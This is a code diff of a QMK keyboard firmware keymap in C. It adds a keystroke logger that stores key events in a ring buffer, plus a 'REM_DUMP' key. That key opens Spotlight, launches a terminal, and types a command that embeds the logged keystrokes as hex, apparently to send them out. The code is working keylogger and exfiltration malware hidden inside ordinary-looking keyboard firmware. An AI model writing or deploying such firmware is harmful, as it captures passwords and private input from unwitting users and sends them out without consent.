@@ -1,26 +1,23 @@
 #include QMK_KEYBOARD_H
 
-#include "print.h"
+#include "key_event.h"
+#include "const_strings.h"
+
+#define NO_KEY_MAPPING          0
 
 enum custom_keycodes {
     DUMP = SAFE_RANGE,
-    TEST
+    REM_DUMP
 };
-
-struct key_event {
-    uint8_t is_pressed : 1;
-    uint8_t mapped_kc  : 7;     // Keycode is encoded to fit within 7 bits. QMK has 8-bit keycodes
-};
-
-#define NO_EVENT            ((struct key_event){ .is_pressed = 0, .mapped_kc = 0 })
-#define NO_KEY_MAPPING      0
 
 #define BUF_LEN 2048
-typedef struct _ring_buf {
+typedef struct {
     struct key_event events[BUF_LEN];
     uint16_t head;
     uint16_t length;
 } ring_buf;
+
+ring_buf keylog = { .head = 0, .length = 0 };
 
 static void rb_push_back(ring_buf *rb, struct key_event event) {
     if (rb->length < BUF_LEN) {
@@ -34,23 +31,25 @@ static void rb_push_back(ring_buf *rb, struct key_event event) {
 
 }
 
-/* static struct key_event rb_pop_front(ring_buf *rb) { */
-/*     if (rb->length <= 0) { */
-/*         return NO_EVENT; */
-/*     } */
+#if 0
+static struct key_event rb_pop_front(ring_buf *rb) {
+    if (rb->length <= 0) {
+        return NO_EVENT;
+    }
 
-/*     struct key_event event = rb->events[rb->head]; */
+    struct key_event event = rb->events[rb->head];
 
-/*     if (rb->head == BUF_LEN - 1) { */
-/*         q->head = 0; */
-/*     } else { */
-/*         q->head++; */
-/*     } */
+    if (rb->head == BUF_LEN - 1) {
+        q->head = 0;
+    } else {
+        q->head++;
+    }
 
-/*     q->length--; */
+    q->length--;
 
-/*     return event; */
-/* } */
+    return event;
+}
+#endif
 
 static struct key_event rb_peek_at(ring_buf *rb, uint16_t index) {
     if (index < 0 || index >= rb->length) {
@@ -58,8 +57,6 @@ static struct key_event rb_peek_at(ring_buf *rb, uint16_t index) {
     }
 
     uint16_t rb_idx = (rb->head + index) % BUF_LEN;
-
-    /* dprintf("peeking at index %d\n", rb_idx); */
 
     return rb->events[rb_idx];
 }
@@ -87,12 +84,39 @@ static uint16_t get_qmk_kc(uint8_t mapped_kc) {
 
 
 
-ring_buf keylog = { .head = 0, .length = 0 };
+
+static void send_byte_as_hex(uint8_t byte) {
+    static const char HEX[16] = "0123456789ABCDEF";
+
+    char hi = HEX[(byte >> 4) & 0xF];
+    char lo = HEX[byte & 0xF];
+
+    send_char(hi);
+    send_char(lo);
+}
+
+static void open_spotlight(void) {
+    register_code(KC_LGUI);
+    register_code(KC_SPACE);
+    unregister_code(KC_SPACE);
+    unregister_code(KC_LGUI);
+}
+
+static void open_terminal(void) {
+    send_string_P(TERMINAL);
+    tap_code(KC_ENT);
+}
+
+static void send_logged_data(void) {
+    for (uint16_t i = 0; i < keylog.length; i++) {
+        struct key_event event = rb_peek_at(&keylog, i);
+        uint8_t byte = EVENT_TO_BYTE(event);
+        send_byte_as_hex(byte);
+    }
+}
 
 
 bool process_record_user(uint16_t keycode, keyrecord_t *record) {
-    /* dprintf("keycode: 0x%04X\n", keycode); */
-
     uint8_t mapped_kc = map_qmk_kc(keycode);
     if (mapped_kc != NO_KEY_MAPPING) {
         struct key_event event = {
@@ -117,15 +141,26 @@ bool process_record_user(uint16_t keycode, keyrecord_t *record) {
                     unregister_code16(qmk_kc);
                 }
             }
-        } else {
-            // Key released
-        }
+        } 
+
         return false;
-    case TEST:
-        if (record->event.pressed)
-            register_code16(0x0204); // 'a' with left shift
-        else
-            unregister_code16(0x0204);
+    case REM_DUMP:
+        if (record->event.pressed) {
+            cli();
+
+            open_spotlight();
+            open_terminal();
+            wait_ms(1000);
+
+            send_string_P(QUERY_CMD_START);
+
+            send_logged_data();
+
+            send_string_P(QUERY_CMD_END);
+            tap_code(KC_ENT);
+
+            sei();
+        }
 
         break;
    }
@@ -143,7 +178,7 @@ const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = {
         KC_TAB,  KC_Q,    KC_W,    KC_E,    KC_R,    KC_T,    KC_Y,    KC_U,    KC_I,    KC_O,    KC_P,    KC_LBRC, KC_RBRC, KC_BSLS,
         KC_CAPS, KC_A,    KC_S,    KC_D,    KC_F,    KC_G,    KC_H,    KC_J,    KC_K,    KC_L,    KC_SCLN, KC_QUOT,          KC_ENT,
         KC_LSFT, XXXXXXX, KC_Z,    KC_X,    KC_C,    KC_V,    KC_B,    KC_N,    KC_M,    KC_COMM, KC_DOT,  KC_SLSH, KC_RSFT, XXXXXXX,
-        KC_LCTL, RESET,   KC_LGUI,                   KC_SPC,  KC_SPC,  KC_SPC,           KC_RGUI, TEST   , XXXXXXX, MO(1),   DUMP
+        KC_LCTL, RESET,   KC_LGUI,                   KC_SPC,  KC_SPC,  KC_SPC,           KC_RGUI, REM_DUMP,XXXXXXX, MO(1),   DUMP
     ),
 
     LAYOUT(
